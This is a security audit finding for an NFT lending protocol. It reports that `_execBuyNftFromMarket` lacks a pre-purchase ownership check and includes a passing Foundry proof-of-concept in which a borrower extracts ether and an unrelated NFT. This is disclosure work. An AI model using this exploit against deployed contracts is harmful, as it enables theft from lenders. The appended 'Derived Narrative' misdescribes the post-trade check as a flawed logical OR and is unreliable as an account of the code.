---
id: 18655
severity: "High"
---

# `_execBuyNftFromMarket`

## Description

```solidity
Use other Lien’s NFTs for repayment
```

## Proof of Concept

```solidity
`_execBuyNftFromMarket()` Whether the NFT is in the current contract after the buy, to represent the successful purchase of NFT.
    
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
...

    if (IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount) {
        revert Errors.InvalidNFTBuy();
    }
}
```

But before executing the purchase, it does not determine whether the NFT is already in the contract.

Since the current protocol does not limit an NFT to only one lien, the `_execBuyNftFromMarket()` does not actually buy NFT; the funds are used to buy other NFTs, but still meet the verification conditions.

Example.

1. Alice transfers NFT_A to supply Lien[1].
2. Bob performs `sellNftToMarket(1)` and NFT_A is bought by Jack.
3. Jack transfer NFT_A and supply Lien[2] (after this NFT_A exists in the contract).
4. Bob executes `buyNftFromMarket(1)` and spends the same amount corresponding to the purchase of other NFT such as: `tradeData = { buy NFT_K }`.
5. Step 4 can be passed `IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount` and Bob gets an additional NFT_K.

Test code:
```solidity
    function testOneNftTwoLien() external {
        //0.lender supply lien[0]
        _approveAndSupply(lender,_tokenId);
        //1.borrower sell to market
        _rawSellToMarketplace(borrower, address(dummyMarketplace), 0, _sellAmount);
        //2.jack buy nft
        address jack = address(0x100);
        vm.startPrank(jack);
        dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);
        vm.stopPrank();
        //3.jack  supply lien[1]
        _approveAndSupply(jack, _tokenId);        
        //4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nft
        OtherDummyERC721 otherDummyERC721 = new OtherDummyERC721("otherNft","otherNft");
        otherDummyERC721.mint(address(dummyMarketplace),1);
        console.log("before borrower balance:",borrower.balance /  1 ether);
        console.log("before otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);
        bytes memory tradeData = abi.encodeWithSignature(
            "buyFromMarket(address,address,uint256)",
            borrower,
            address(otherDummyERC721),//<--------buy other nft
            1
        );
        vm.startPrank(borrower);
        particleExchange.buyNftFromMarket(
            _activeLien, 0, _tokenId, _sellAmount, 0, address(dummyMarketplace), tradeData);
        vm.stopPrank();
        //5.show borrower get 10 ether back , and get  other nft
        console.log("after borrower balance:",borrower.balance /  1 ether);
        console.log("after otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);

    }

    contract OtherDummyERC721 is ERC721 {
        // solhint-disable-next-line no-empty-blocks
        constructor(string memory name, string memory symbol) ERC721(name, symbol) {}

        function mint(address to, uint256 tokenId) external {
            _safeMint(to, tokenId);
        }
    }

    $ forge test --match testOneNftTwoLien  -vvv

    [PASS] testOneNftTwoLien() (gas: 1466296)
    Logs:
      before borrower balance: 0
      before otherDummyERC721's owner is borrower : false
      after borrower balance: 10
      after otherDummyERC721's owner is borrower : true

    Test result: ok. 1 passed; 0 failed; finished in 6.44ms
```

## Recommendation

```solidity
`_execBuyNftFromMarket` to determine the `ownerOf()` is not equal to the contract address before buying.
    
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
        if (!registeredMarketplaces[marketplace]) {
            revert Errors.UnregisteredMarketplace();
        }
        require(IERC721(collection).ownerOf(tokenId) != address(this),"NFT is already in contract ")
    ...
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract contains a logical flaw in the routine that purchases an NFT from an external marketplace. The function responsible for the purchase does not verify that the NFT identified by the supplied collection address and token ID is not already owned by the contract before executing the trade. Because the contract can already hold the same NFT as collateral for a previous lien, the missing pre‑check allows an attacker to trigger a purchase transaction that actually acquires a different NFT while the verification logic after the trade still succeeds. The post‑trade check only confirms that the contract is not the owner of the requested token (ownerOf != address(this)) or that the contract’s ether balance decreased by the expected amount, but it uses a logical OR, so the condition can be satisfied even when the NFT is already in the contract. Consequently, a borrower can call the buy function, pay the expected amount, and receive an unrelated NFT without losing any additional funds, effectively creating a second lien on the same original NFT and extracting an extra asset. This bug manifests when the protocol allows multiple liens to reference the same NFT and when the marketplace call is crafted to buy a different token (tradeData encodes a purchase of another NFT). Users of the protocol, such as lenders and borrowers, are affected because the accounting assumptions that each lien corresponds to a unique collateral NFT are broken, leading to unauthorized asset acquisition and potential loss of trust in the platform. The issue was discovered during a security audit that exercised the function with a test scenario where an NFT was supplied to two different liens and the buy function was called with trade data pointing to a third NFT; the test showed the borrower’s balance increased and the third NFT was transferred to the borrower despite the contract already holding the original NFT. The problem is subtle because the post‑trade assertion appears to protect against incorrect purchases, yet the logical operator and missing pre‑condition allow the exploit to slip through unnoticed. To remediate, the purchase routine should first assert that the target NFT is not already owned by the contract (ownerOf(tokenId) != address(this)) before initiating the marketplace call, and the post‑trade verification should require both ownership change and exact balance deduction using a logical AND. This ensures each lien is tied to a distinct collateral NFT and prevents the contract from unintentionally acquiring unrelated assets.
